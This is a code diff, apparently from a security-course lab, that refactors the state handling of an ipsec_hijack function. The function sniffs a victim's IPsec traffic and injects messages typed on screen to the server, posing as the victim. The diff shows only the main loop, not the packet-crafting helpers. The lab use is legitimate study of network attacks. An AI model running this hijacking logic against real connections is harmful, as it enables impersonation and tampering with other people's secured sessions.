@@ -27,10 +27,7 @@ void ipsec_hijack(char* INTERFACE) {
     timeval timeout = {.tv_sec = 0, .tv_usec = 1};
 
     bool first = true;
-
-    // FIXME: Can I use new ?
-    int* state = (int*)malloc(sizeof(int));
-    *state = WAIT_PKT;
+    int state = WAIT_PKT;
     /*
      * state WAIT_PKT: wait for packet sent by victim to get the information of
      * the header
@@ -40,14 +37,13 @@ void ipsec_hijack(char* INTERFACE) {
      * back to server
      */
 
-    bool* test_for_dissect = (bool*)malloc(sizeof(bool));
-    *test_for_dissect = true;
+    bool test_for_dissect = true;
     char* victim_ip = (char*)malloc(sizeof(char) * 64);
     char* server_ip = (char*)malloc(sizeof(char) * 64);
     while (1) {
         /*you have to get the information from the packet you are sniffing*/
-        get_info(&dev, &net, &esp, &txp, state, victim_ip, server_ip,
-                 test_for_dissect);
+        get_info(&dev, &net, &esp, &txp, &state, victim_ip, server_ip,
+                 &test_for_dissect);
 
         if (first) {
             first = false;
@@ -55,7 +51,7 @@ void ipsec_hijack(char* INTERFACE) {
             strcpy(server_ip, net.dst_ip.data());
         }
 
-        if (*state == SEND_ACK) {
+        if (state == SEND_ACK) {
             /*
              * when receiver receive a packet from sender, receiver should reply
              * a ACK packet to sender, then sender will know that the packet has
@@ -63,9 +59,9 @@ void ipsec_hijack(char* INTERFACE) {
              * server, after we receive the secret.
              */
             send_msg(&dev, &net, &esp, &txp, NULL);
-            *state = WAIT_PKT;
-            get_info(&dev, &net, &esp, &txp, state, victim_ip, server_ip,
-                     test_for_dissect);
+            state = WAIT_PKT;
+            get_info(&dev, &net, &esp, &txp, &state, victim_ip, server_ip,
+                     &test_for_dissect);
         }
 
         char const* const x_src_ip = strdup(net.x_src_ip.data());
@@ -88,7 +84,7 @@ void ipsec_hijack(char* INTERFACE) {
             }
             /* send the message you input on the screen to server */
             send_msg(&dev, &net, &esp, &txp, str);
-            *state = WAIT_SECRET;
+            state = WAIT_SECRET;
         }
     }
 }
